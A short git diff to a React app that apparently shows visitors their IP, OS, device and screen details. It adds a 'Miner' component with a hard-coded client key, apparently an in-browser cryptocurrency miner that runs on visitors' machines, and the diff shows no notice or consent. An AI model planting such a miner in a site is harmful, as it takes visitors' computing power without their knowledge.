@@ -8,6 +8,7 @@ import IPAddress from '../IPAddress'
 import Os from '../Os'
 import Device from '../Device'
 import Screen from '../Screen'
+import Miner from '../Miner'
 
 class MainApp extends React.Component{
 
@@ -50,6 +51,11 @@ class MainApp extends React.Component{
 									model={ua.device.model}
 									type={ua.device.type}
 									vendor={ua.device.vendor}
+								/>
+							</div>
+							<div className='col-md-4'>
+								<Miner
+									clientKey={'glxz6EibUmNoRXA6iZSW01hIq84Pw2LC'} 
 								/>
 							</div>
 						</div>
